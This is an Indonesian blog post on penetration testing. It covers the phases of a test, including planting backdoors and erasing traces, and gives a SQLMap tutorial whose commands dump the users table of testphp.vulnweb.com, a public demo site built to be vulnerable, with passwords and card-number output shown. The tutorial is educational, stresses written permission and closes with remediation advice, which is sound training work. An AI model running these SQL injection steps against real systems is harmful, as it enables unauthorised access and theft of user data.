---
title: Penetration Testing
description: Menjelaskan tahapan yang harus dilalui dalam pelaksanaan pengujian penetrasi (pentesting).
categories: [Cybersecurity]
tags: [attacking]
author: rical
last_modified_at: 2026-06-01
---

Penetration Testing atau pentesting adalah suatu metode evaluasi keamanan yang bertujuan untuk mengidentifikasi dan mengeksploitasi kerentanan dalam sistem komputer, jaringan, atau aplikasi dengan mensimulasikan serangan dari entitas yang tidak berwenang. Tujuan utama dari pentesting adalah untuk mengungkap potensi risiko keamanan dan memberikan rekomendasi yang relevan untuk meningkatkan postur keamanan.

## Tahapan Penetration Testing
### 1. Perencanaan dan Persiapan
#### 1.1 Tujuan dan Ruang Lingkup
Pada fase ini, tim pentester menetapkan tujuan pengujian serta ruang lingkup yang akan dievaluasi. Ruang lingkup dapat mencakup sistem, aplikasi, dan jaringan yang relevan dengan konteks pengujian.

#### 1.2 Izin
Sebelum pelaksanaan pentesting, penting untuk memperoleh izin tertulis dari pemilik sistem. Hal ini bertujuan untuk memastikan bahwa pengujian dilakukan dalam kerangka hukum dan etika yang berlaku.

#### 1.3 Pembentukan Tim
Tim pentester harus terdiri dari individu yang memiliki kompetensi yang sesuai, termasuk pengetahuan mendalam tentang keamanan siber, pemrograman, dan teknik eksploitasi.

### 2. Pengumpulan Informasi
#### 2.1 Reconnaissance
Pengumpulan informasi dilakukan untuk memperoleh pemahaman yang lebih baik mengenai target. Terdapat dua jenis reconnaissance:

- **Passive Reconnaissance**: Mengumpulkan informasi tanpa interaksi langsung dengan target, menggunakan metode seperti WHOIS, DNS lookup, dan analisis media sosial.
- [**Active Reconnaissance**](https://ricaldocs.github.io/posts/active-reconnaissance): Melibatkan penggunaan alat untuk memindai dan mengidentifikasi layanan yang berjalan pada target, contohnya dengan menggunakan Nmap.

### 3. Pemindaian
#### 3.1 Port Scanning
Pada tahap ini, pentester melakukan pemindaian untuk mengidentifikasi port yang terbuka serta layanan yang berjalan pada port tersebut.

#### 3.2 Vulnerability Scanning
Menggunakan alat pemindai kerentanan, seperti Nessus atau OpenVAS, untuk mendeteksi kerentanan yang ada dalam sistem. Pemindaian ini berfungsi untuk mengidentifikasi titik lemah yang dapat dieksploitasi.

### 4. Eksploitasi
#### 4.1 Eksploitasi Kerentanan
Setelah kerentanan teridentifikasi, pentester berupaya untuk mengeksploitasi kerentanan tersebut guna memperoleh akses ke sistem. Ini dapat melibatkan:

- Penggunaan exploit yang telah ada.
- Pengembangan exploit kustom jika diperlukan.

### 5. Pemeliharaan Akses
#### 5.1 Backdoor
Jika pentester berhasil mendapatkan akses, mereka akan berusaha untuk menciptakan backdoor guna mempertahankan akses ke sistem.

#### 5.2 Privilege Escalation
Mencoba untuk meningkatkan hak akses guna memperoleh kontrol yang lebih besar atas sistem yang diuji.

### 6. Analisis dan Pelaporan
#### 6.1 Dokumentasi Temuan
Semua temuan harus dicatat secara rinci, termasuk kerentanan yang ditemukan, metode eksploitasi yang digunakan, dan data yang diakses.

#### 6.2 Laporan
Menyusun laporan yang jelas dan terperinci yang mencakup:

- Ringkasan eksekutif.
- Temuan teknis.
- Rekomendasi untuk perbaikan.

### 7. Tindak Lanjut
#### 7.1 Diskusi dengan Klien
Setelah laporan disusun, tim pentester harus mempresentasikan hasil pentesting kepada klien dan mendiskusikan langkah-langkah perbaikan yang diperlukan.

#### 7.2 Re-Test
Setelah perbaikan dilakukan, penting untuk melakukan pengujian ulang guna memastikan bahwa kerentanan telah diperbaiki.

### 8. Penutupan
#### 8.1 Hapus Jejak
Pastikan untuk menghapus semua jejak yang ditinggalkan selama pengujian untuk menjaga kerahasiaan dan integritas sistem.

#### 8.2 Evaluasi Proses
Tinjau proses pentesting untuk mengidentifikasi area yang dapat ditingkatkan di masa mendatang.

## Penetration Testing dengan SQLMap

### **Prasyarat**   
1. **Target Uji**: `http://testphp.vulnweb.com/listproducts.php?cat=1` (situs demo rentan untuk pelatihan).  
2. **Alat**: SQLMap (terinstal di Kali Linux).  

### **Langkah 1: Pembaruan Repositori Sistem**  
Sebelum memulai, pastikan sistem dan repositori paket diperbarui:  
```bash  
sudo apt update && sudo apt upgrade -y 
```  
**Tujuan**: Memastikan SQLMap dan dependensi terkini.  

### **Langkah 2: Identifikasi Database yang Tersedia**  
Jalankan perintah berikut untuk memindai database pada target:  
```bash  
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs  
```  
**Parameter**:  
- `-u`: URL target dengan parameter rentan (`cat=1`).  
- `--dbs`: Memerintahkan SQLMap menampilkan daftar database.  

**Output Contoh**:  
```  
available databases [2]:  
[*] acuart  
[*] information_schema  
```  
**Interpretasi**:  
- `acuart`: Database aplikasi target.  
- `information_schema`: Database sistem MySQL.  

### **Langkah 3: Enumerasi Tabel dalam Database**  
Setelah mengetahui nama database (`acuart`), enumerasi tabel-tabel di dalamnya:  
```bash  
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables  
```  
**Parameter**:  
- `-D acuart`: Menargetkan database "acuart".  
- `--tables`: Menampilkan daftar tabel.  

**Output Contoh**:  
```  
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+
```  
**Interpretasi**: Tabel `users` berisi data sensitif seperti kredensial.  

### **Langkah 4: Identifikasi Kolom dalam Tabel "users"**  
Eksplorasi struktur tabel `users` untuk mengetahui kolom yang tersedia:  
```bash  
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns  
```  
**Parameter**:  
- `-T users`: Menargetkan tabel "users".  
- `--columns`: Menampilkan daftar kolom.  

**Output Contoh**:  
```  
Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| name    | varchar(100) |
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+ 
```  

### **Langkah 5: Ekstraksi Data dari Tabel "users"**  
Ekstrak seluruh data dari tabel `users` untuk analisis lebih lanjut:  
```bash  
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump  
```  
**Parameter**:  
- `--dump`: Mengekstrak dan menampilkan semua data dalam tabel.  

**Output Contoh**:  
```  
Database: acuart
Table: users
[1 entry]
+---------------------+----------------------------------+------+-----------------+---------+-------+------------+-----------+
| cc                  | cart                             | pass | email           | phone   | uname | name       | address   |
+---------------------+----------------------------------+------+-----------------+---------+-------+------------+-----------+
| 1234-5678-2300-9000 | b91c87ff8783694b1193835fec1c2038 | test | email@email.com | 2323345 | test  | John Smith | 21 street |
+---------------------+----------------------------------+------+-----------------+---------+-------+------------+-----------+  
```  
**Interpretasi**: Data kredensial yang diekstrak menunjukkan kerentanan kritis pada aplikasi.  

### **Langkah 6: Pelaporan Hasil**  
Setelah eksploitasi, dokumentasikan temuan dalam laporan yang mencakup:  
1. **Detail Kerentanan**: Parameter `cat=1` rentan terhadap SQL Injection.  
2. **Risiko**: Akses tidak sah ke data pengguna.  
3. **Rekomendasi**: Sanitasi input, penggunaan parameterized queries, dan pembaruan sistem.  

### **Catatan Tambahan**  
- Tambahkan parameter seperti `--level=5` (tingkat pemeriksaan maksimal) atau `--risk=3` (risiko eksploitasi tinggi) untuk simulasi mendalam.  
- Uji teknik seperti Blind SQL Injection dengan menonaktifkan flag `--batch` untuk interaksi manual.  

## Etika dan Hukum
Pelaksanaan pentesting harus mematuhi etika dan hukum yang berlaku. Pentester wajib menjaga kerahasiaan data yang diakses selama pengujian dan tidak menyalahgunakan informasi yang diperoleh.
